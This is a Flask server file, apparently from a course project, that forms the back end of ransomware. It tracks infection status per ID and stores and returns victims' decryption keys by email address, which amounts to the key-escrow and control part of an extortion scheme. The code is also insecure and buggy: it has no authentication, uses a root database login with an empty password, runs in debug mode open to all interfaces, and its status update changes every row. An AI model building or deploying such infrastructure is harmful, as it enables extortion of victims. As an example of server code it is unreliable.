from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+mysqlconnector://root:@localhost:3306/cs440'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

CORS(app)


class Status(db.Model):
    __tablename__ = 'ransomware'

    id = db.Column(db.Integer, primary_key=True)
    status = db.Column(db.Integer)

    def __init__(self, id, status):
        self.id = id
        self.status = status

    def json(self):
        return {"id": self.id, "status": self.status}


class Decrypt(db.Model):
    __tablename__ = 'decrypt'

    id = db.Column(db.Integer, primary_key=True)
    decrypt_key = db.Column(db.VARCHAR(500))
    email = db.Column(db.VARCHAR(500))

    def __init__(self, decrypt_key, email):
        self.decrypt_key = decrypt_key
        self.email = email

    def json(self):
        return {"id": self.id, "decrypt_key": self.decrypt_key, "email": self.email}


# STATUS
@app.route("/get_status/<int:id>")
def getStatus(id):
    status = Status.query.filter_by(id=id).first()
    if status:
        return jsonify(
            {
                "code": 200,
                "data": status.json()
            }
        )
    return jsonify(
        {
            "code": 404,
            "message": "No status found"
        }
    ), 404


@app.route("/add_status/<int:id>", methods=['POST'])
def addStatus(id):
    status = Status.query.filter_by(id=id).first()
    if (status):
        return jsonify(
            {
                "code": 400,
                "data": {
                    "id": id
                },
                "message": "status already exist"
            }
        ), 400

    status = Status(id=id, status=0)

    try:
        db.session.add(status)
        db.session.commit()
    except:
        return jsonify(
            {
                "code": 500,
                "data": {
                    "id": id
                },
                "message": "An error occurred status."
            }
        ), 500

    return jsonify(
        {
            "code": 201,
            "data": status.json()
        }
    ), 201


@app.route("/change_status/<int:id>", methods=['PUT'])
def changeStatus(id):
    status = Status.query.filter_by(id=id).first()
    if not (status):
        return jsonify(
            {
                "code": 400,
                "data": {
                    "id": id
                },
                "message": "status doesn't exist"
            }
        ), 400

    # status = Status(id=id, status=1)

    try:
        db.session.query(Status).update({Status.status: 1})
        db.session.commit()
    except:
        return jsonify(
            {
                "code": 500,
                "data": {
                    "id": id
                },
                "message": "An error occurred status."
            }
        ), 500

    return jsonify(
        {
            "code": 201,
            "data": status.json()
        }
    ), 201


# DECRYPT
@app.route("/get_decrypt/<string:email>")
def getDecryptKey(email):
    decrypt = Decrypt.query.filter_by(email=email).first()
    if decrypt:
        return decrypt.json()['decrypt_key']


@app.route("/add_decrypt/<string:decrypt_key>/<string:email>", methods=['POST'])
def addDecryptKey(decrypt_key, email):
    decrypt_key = Decrypt(decrypt_key=decrypt_key,
                          email=email)

    try:
        db.session.add(decrypt_key)
        db.session.commit()
    except:
        return jsonify(
            {
                "code": 500,
                "data": {
                    "id": id
                },
                "message": "An error occurred decrypt."
            }
        ), 500

    return jsonify(
        {
            "code": 201,
            "data": decrypt_key.json()
        }
    ), 201


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
